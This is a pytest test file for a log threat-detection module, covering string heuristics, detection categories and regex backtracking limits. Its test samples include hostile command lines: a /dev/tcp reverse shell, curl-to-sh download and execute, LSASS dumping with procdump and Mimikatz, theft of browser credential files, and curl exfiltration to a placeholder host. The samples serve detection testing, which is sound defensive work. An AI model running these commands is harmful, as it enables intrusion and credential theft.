"""Tests for pure heuristic functions in app.threat_detection."""

from __future__ import annotations

import pytest

from app.threat_detection import (
    _edit_distance,
    _has_visual_trick,
    _max_severity,
    _shannon_entropy,
    _smart_excerpt,
)

# ── _shannon_entropy ─────────────────────────────────────────────────────────


class TestShannonEntropy:
    def test_empty_string(self):
        assert _shannon_entropy("") == 0.0

    def test_single_char(self):
        assert _shannon_entropy("aaaa") == 0.0

    def test_two_equal_chars(self):
        # "ab" → 1.0 bit
        assert _shannon_entropy("ab") == pytest.approx(1.0)

    def test_uniform_distribution(self):
        # 4 distinct chars, equal frequency → 2.0 bits
        assert _shannon_entropy("abcd") == pytest.approx(2.0)

    def test_high_entropy_string(self):
        s = "aB3$xY7!qZ9@"
        ent = _shannon_entropy(s)
        assert ent > 3.0


# ── _edit_distance ───────────────────────────────────────────────────────────


class TestEditDistance:
    def test_identical(self):
        assert _edit_distance("abc", "abc") == 0

    def test_insert(self):
        assert _edit_distance("abc", "abcd") == 1

    def test_delete(self):
        assert _edit_distance("abcd", "abc") == 1

    def test_replace(self):
        assert _edit_distance("abc", "axc") == 1

    def test_empty_strings(self):
        assert _edit_distance("", "") == 0
        assert _edit_distance("abc", "") == 3
        assert _edit_distance("", "xyz") == 3

    def test_completely_different(self):
        assert _edit_distance("abc", "xyz") == 3


# ── _has_visual_trick ────────────────────────────────────────────────────────


class TestHasVisualTrick:
    def test_o_zero_swap(self):
        assert _has_visual_trick("sv0host.exe", "svohost.exe") is True

    def test_transposition(self):
        assert _has_visual_trick("expolrer.exe", "explorer.exe") is True

    def test_single_char_insertion(self):
        assert _has_visual_trick("svchostt.exe", "svchost.exe") is True

    def test_no_trick_exact_match(self):
        # exact match is not a trick
        assert _has_visual_trick("svchost.exe", "svchost.exe") is False

    def test_empty_after_strip(self):
        assert _has_visual_trick(".exe", ".exe") is False

    def test_length_too_different(self):
        assert _has_visual_trick("abc.exe", "abcdefgh.exe") is False


# ── _smart_excerpt ───────────────────────────────────────────────────────────


class TestSmartExcerpt:
    def test_short_value_returned_as_is(self):
        val = "hello world"
        assert _smart_excerpt(val, 0, 5) == val

    def test_long_value_truncated(self):
        val = "A" * 200
        result = _smart_excerpt(val, 50, 55, max_len=80)
        assert len(result) <= 80


# ── _max_severity ────────────────────────────────────────────────────────────


class TestMaxSeverity:
    def test_single(self):
        assert _max_severity("high") == "high"

    def test_ordering(self):
        assert _max_severity("low", "high") == "high"
        assert _max_severity("informational", "critical") == "critical"
        assert _max_severity("medium", "low") == "medium"

    def test_no_args(self):
        assert _max_severity() == "informational"

    def test_unknown_severity(self):
        assert _max_severity("banana", "low") == "low"


# ── Linux categories (shipped config/threat_detection.yaml) ─────────────────


class TestLinuxCategories:
    @staticmethod
    def _detect(event: dict) -> dict:
        from app.threat_detection import compute_threat_detection

        return compute_threat_detection([[event]])

    def test_gtfobins_hit_on_exe(self):
        res = self._detect({"exe": "/usr/bin/nmap"})
        assert "gtfobins_usage" in res["categories"]

    def test_gtfobins_hit_on_comm(self):
        res = self._detect({"comm": "socat"})
        assert "gtfobins_usage" in res["categories"]

    def test_gtfobins_no_hit_on_regular_daemon(self):
        res = self._detect({"exe": "/usr/sbin/sshd"})
        assert "gtfobins_usage" not in res["categories"]

    def test_download_exec_curl_pipe_sh(self):
        res = self._detect({"proctitle": "curl http://x.example/a | sh"})
        assert "linux_download_exec" in res["categories"]

    def test_download_exec_plain_curl_no_hit(self):
        res = self._detect({"proctitle": "curl https://example.com/health"})
        assert "linux_download_exec" not in res["categories"]

    def test_download_exec_dev_tcp_reverse_shell(self):
        res = self._detect({"proctitle": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"})
        assert "linux_download_exec" in res["categories"]

    def test_download_exec_base64_decode_pipe(self):
        res = self._detect({"proctitle": "echo aGk= | base64 -d | sh"})
        assert "linux_download_exec" in res["categories"]

    def test_persistence_cron_write(self):
        res = self._detect({"proctitle": "bash -c 'echo evil >> /etc/cron.d/backdoor'"})
        assert "linux_persistence" in res["categories"]

    def test_persistence_authorized_keys(self):
        res = self._detect({"proctitle": "cat pub.key >> /home/user/.ssh/authorized_keys"})
        assert "linux_persistence" in res["categories"]

    def test_priv_esc_setuid_chmod(self):
        res = self._detect({"proctitle": "chmod u+s /tmp/rootshell"})
        assert "linux_priv_esc" in res["categories"]

    def test_priv_esc_suid_find(self):
        res = self._detect({"proctitle": "find / -perm -4000 -type f"})
        assert "linux_priv_esc" in res["categories"]

    def test_obfuscation_reads_proctitle(self):
        res = self._detect({"proctitle": "pwsh -c [Convert]::FromBase64String($x)"})
        assert "cmdline_obfuscation" in res["categories"]

    def test_windows_event_untouched_by_linux_categories(self):
        res = self._detect({"Image": "C:\\Windows\\System32\\certutil.exe"})
        assert "lolbin_usage" in res["categories"]
        assert "gtfobins_usage" not in res["categories"]
        assert "linux_download_exec" not in res["categories"]


def test_every_regex_pattern_is_case_insensitive():
    """Patterns match attacker-chosen casing, not just the casing in the YAML.

    All but two entries in config/threat_detection.yaml carried an inline `(?i)`. One of
    the exceptions was `double_extension`, so `invoice.pdf.exe` was flagged but
    `invoice.pdf.EXE` sailed through — the casing an attacker is more likely to use.
    Compiling with re.IGNORECASE removes the per-entry footgun entirely.
    """
    import re

    from app.threat_detection import get_threat_config

    case_sensitive = [
        f"{key}/{p['name']}"
        for key, cat in get_threat_config().items()
        if isinstance(cat, dict)
        for chk in (cat.get("checks") or [])
        for p in (chk.get("compiled_patterns") or [])
        if not p["regex"].flags & re.IGNORECASE
    ]
    assert not case_sensitive, f"case-sensitive threat patterns: {case_sensitive}"


def test_double_extension_matches_uppercase():

    from app.threat_detection import get_threat_config

    rx = next(
        p["regex"]
        for cat in get_threat_config().values()
        if isinstance(cat, dict)
        for chk in (cat.get("checks") or [])
        for p in (chk.get("compiled_patterns") or [])
        if p["name"] == "double_extension"
    )
    assert rx.search("invoice.pdf.exe")
    assert rx.search("invoice.pdf.EXE")
    assert rx.search("Report.doc.Scr")
    assert not rx.search("report.pdf")


# ── Backtracking bounds (shipped config/threat_detection.yaml) ───────────────


def _tags(event: dict) -> set[str]:
    from app.threat_detection import compute_threat_detection

    res = compute_threat_detection([[event]])
    return {i["tag"] for cat in res["categories"].values() for i in cat["indicators"]}


def _run_within(budget_s: float, fn, *args):
    """Run ``fn`` and fail the test if it is still running after ``budget_s``.

    sre polls for signals while backtracking, so SIGALRM interrupts a runaway
    search instead of letting the test hang for minutes.
    """
    import signal
    import time

    class _Budget(Exception):
        pass

    def _alarm(*_):
        raise _Budget

    old = signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, budget_s)
    start = time.perf_counter()
    try:
        return fn(*args)
    except _Budget:
        pytest.fail(f"still matching after {time.perf_counter() - start:.2f}s (budget {budget_s}s)")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
        signal.signal(signal.SIGALRM, old)


_N = 32 * 1024

# Each value repeats a pattern's leading literal (or pads a quantified run)
# without ever completing the match. With unbounded `X.*Y` gaps sre re-scans
# the rest of the line from every X, which is quadratic, and cubic for the
# three-literal patterns: `[char]` + 1000 digits x2 took ~4.5s and
# `rundll32 comsvcs ` x300 ~5s against the unbounded patterns.
_ADVERSARIAL = {
    "char_array_digits_small": "[char]" + "1" * 1000 + "[char]" + "1" * 1000,
    "char_array_digits": "[char]" + "1" * (_N // 2) + "[char]" + "1" * (_N // 2),
    "char_array_spaces": "[char]1" + " " * _N + "[char]1",
    "lsass_rundll_comsvcs_small": "rundll32 comsvcs " * 300,
    "lsass_rundll_comsvcs": "rundll32 comsvcs " * (_N // 17),
    "lsass_procdump": "procdump " * (_N // 9),
    "lsass_openprocess": "OpenProcess " * (_N // 12),
    "browser_appdata": "AppData\\" * (_N // 8),
    "browser_mozilla": "Mozilla/" * (_N // 8),
    "amsi_preferred_ui": "SetPreferredUILanguages " * (_N // 24),
    "etw_ntdll": "ntdll EventWrite " * (_N // 17),
    "timestomp_filename": "$FileName " * (_N // 10),
    "invoke_webrequest": "Invoke-WebRequest " * (_N // 18),
    "curl_repeat": "curl " * (_N // 5),
    "curl_spaces": "curl" + " " * _N + "x",
    "copy_repeat": "copy " * (_N // 5),
    "copy_spaces": "copy" + " " * _N + "x",
    "python_c_spaces": "python -c" + " " * _N + "x",
    "oversized_value": "procdump " * (_N * 4 // 9),
}


@pytest.mark.parametrize("value", list(_ADVERSARIAL.values()), ids=list(_ADVERSARIAL))
def test_regex_checks_do_not_backtrack_polynomially(value):
    """A crafted field value must not stall the analytics worker (ReDoS)."""
    _run_within(2.0, _tags, {"CommandLine": value, "ScriptBlockText": value})


@pytest.mark.parametrize(
    "value,tag",
    [
        ("powershell -c iex(([char]73+[char]69+[char]88) -join '')", "CHAR_ARRAY_OBFUSCATION"),
        ("$s = [char] 105 + [char]101 + [char] 120", "CHAR_ARRAY_OBFUSCATION"),
        ("procdump.exe -accepteula -ma lsass.exe C:\\temp\\out.dmp", "LSASS_ACCESS"),
        (
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\x.bin full",
            "LSASS_ACCESS",
        ),
        ("Invoke-Mimikatz -Command sekurlsa::logonpasswords", "LSASS_ACCESS"),
        ("OpenProcess(0x1410, false, lsass_pid)", "LSASS_ACCESS"),
        ("procdump64 -ma lsass", "CREDENTIAL_TOOLS"),
        (
            "copy C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data x",
            "BROWSER_CREDENTIALS",
        ),
        (
            "type C:\\Users\\bob\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ab.default\\logins.json",
            "BROWSER_CREDENTIALS",
        ),
        ("[Runtime.InteropServices.Marshal]::SetPreferredUILanguages; kernel32", "AMSI_BYPASS"),
        ("$p = GetProcAddress(ntdll, 'EtwEventWrite')", "ETW_PATCHING"),
        ("$FileName attribute Modified to 2019-01-01", "TIMESTOMPING"),
        ("Invoke-WebRequest -OutFile a.exe -Uri http://x.example/a.exe", "DOWNLOAD_CRADLE"),
        ("curl.exe -s -H 'A: b' -X POST https://x.example/u", "UPLOAD_INDICATOR"),
        ("curl -k --data @loot.zip https://x.example/u", "UPLOAD_INDICATOR"),
        ("Invoke-WebRequest -Uri https://x.example -Method Post -InFile a", "UPLOAD_INDICATOR"),
        ("robocopy C:\\data \\\\fileserver\\share /E", "NETWORK_COPY"),
        ("cmd /c copy secrets.txt \\\\10.0.0.5\\c$\\tmp", "NETWORK_COPY"),
    ],
)
def test_bounded_regexes_still_match_malicious_samples(value, tag):
    assert tag in _tags({"CommandLine": value})


@pytest.mark.parametrize(
    "value,tag",
    [
        ("powershell -c Write-Host [char]65", "CHAR_ARRAY_OBFUSCATION"),
        ("rundll32.exe shell32.dll,Control_RunDLL desk.cpl", "LSASS_ACCESS"),
        ("procdump -ma notepad.exe", "LSASS_ACCESS"),
        ("copy a.txt b.txt", "NETWORK_COPY"),
        ("curl https://example.com/health", "UPLOAD_INDICATOR"),
        ("Invoke-WebRequest https://example.com", "DOWNLOAD_CRADLE"),
    ],
)
def test_bounded_regexes_skip_benign_samples(value, tag):
    assert tag not in _tags({"CommandLine": value})


def test_full_fields_and_long_gaps_are_still_scanned():
    assert "LSASS_ACCESS" in _tags({"CommandLine": "procdump" + " " * 300 + "lsass"})
    assert "BASE64_FROMBASE64" in _tags({"CommandLine": "x" * 40000 + " FromBase64String"})


def test_regex_work_is_bounded_across_events_and_other_checks_continue(monkeypatch):
    import time

    import app.threat_detection as td

    monkeypatch.setattr(td, "REGEX_TOTAL_SECONDS", 0.06)
    # The fixed budget alone; the per-event allowance has its own tests below.
    monkeypatch.setattr(td, "REGEX_EVENT_SECONDS", 0.0)
    monkeypatch.setattr(td, "REGEX_KB_SECONDS", 0.0)
    monkeypatch.setattr(
        td,
        "_cached",
        td._compile_config(
            {
                "categories": {
                    "test": {
                        "label": "Test",
                        "checks": [
                            {"type": "regex", "fields": ["CommandLine"], "patterns": [{"name": "slow", "pattern": "(a+)+$"}]},
                            {"type": "keyword_in_value", "name": "marker", "fields": ["CommandLine"], "values": ["marker"]},
                        ],
                    }
                }
            }
        ),
    )
    acc = td.ThreatAccumulator()
    started = time.monotonic()
    for _ in range(100):
        acc.add([{"CommandLine": "a" * 30000 + "! marker"}])
    result = acc.result()
    assert time.monotonic() - started < 1
    assert result["incomplete"] and result["regex_budget_exhausted"]
    assert result["regex_timeouts"] > 0
    assert result["categories"]["test"]["indicators"][0]["count"] == 100
    fresh = td.ThreatAccumulator()
    fresh.add([{"CommandLine": "aaa"}])
    assert not fresh.result().get("incomplete")
    assert fresh.result()["total_indicators"] == 1


def _slow_and_lsass_config(td):
    return td._compile_config(
        {
            "categories": {
                "test": {
                    "label": "Test",
                    "checks": [
                        {
                            "type": "regex",
                            "fields": ["CommandLine"],
                            "patterns": [
                                {"name": "slow", "pattern": "(a+)+$"},
                                {"name": "lsass_dump", "pattern": r"procdump.*-ma\s+lsass"},
                            ],
                        },
                    ],
                }
            }
        }
    )


def test_a_large_clean_job_never_runs_the_budget_dry(monkeypatch):
    """Ordinary matching is charged to the budget too, so a flat budget went dry on large
    jobs and silently skipped every check after that point. Each event now pays its own way."""
    import app.threat_detection as td

    monkeypatch.setattr(td, "REGEX_TOTAL_SECONDS", 0.001)
    monkeypatch.setattr(td, "_cached", _slow_and_lsass_config(td))
    acc = td.ThreatAccumulator()
    for i in range(2000):
        acc.add([{"CommandLine": f"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule {i} " + "x" * 2000}])
    acc.add([{"CommandLine": "procdump.exe -accepteula -ma lsass.exe out.dmp"}])
    result = acc.result()
    assert not result.get("incomplete")
    assert result["categories"]["test"]["indicators"][0]["tag"] == "LSASS_DUMP"


def test_crafted_events_cannot_switch_off_the_checks_after_them(monkeypatch):
    """A few pathological events at the top of a log used to spend the whole budget, so a
    real dump later in the same job went unflagged. They still cost bounded time and the
    result says it is incomplete, but the events after them are checked."""
    import time

    import app.threat_detection as td

    monkeypatch.setattr(td, "REGEX_TOTAL_SECONDS", 0.05)
    monkeypatch.setattr(td, "_cached", _slow_and_lsass_config(td))
    acc = td.ThreatAccumulator()
    crafted = "a" * 30000 + "!"
    started = time.monotonic()
    for _ in range(20):
        acc.add([{"CommandLine": crafted}])
    spent = time.monotonic() - started
    acc.add([{"CommandLine": "procdump.exe -accepteula -ma lsass.exe out.dmp"}])
    result = acc.result()

    allowance = td.REGEX_TOTAL_SECONDS + 20 * (td.REGEX_EVENT_SECONDS + td.REGEX_KB_SECONDS * len(crafted) / 1024)
    assert spent < allowance + 0.5
    assert result["incomplete"] and result["regex_timeouts"] > 0
    assert [i["tag"] for i in result["categories"]["test"]["indicators"]] == ["LSASS_DUMP"]


def test_the_allowance_has_an_absolute_ceiling(monkeypatch):
    """Per-event credit must not turn a large crafted upload into unbounded worker time."""
    import time

    import app.threat_detection as td

    monkeypatch.setattr(td, "REGEX_TOTAL_SECONDS", 0.05)
    monkeypatch.setattr(td, "REGEX_MAX_SECONDS", 0.15)
    monkeypatch.setattr(td, "_cached", _slow_and_lsass_config(td))
    acc = td.ThreatAccumulator()
    started = time.monotonic()
    for _ in range(100):
        acc.add([{"CommandLine": "a" * 30000 + "!"}])
    spent = time.monotonic() - started
    result = acc.result()

    assert acc._regex_budget.granted == pytest.approx(td.REGEX_MAX_SECONDS)
    assert spent < td.REGEX_MAX_SECONDS + 0.5
    assert result["incomplete"] and result["regex_budget_exhausted"]
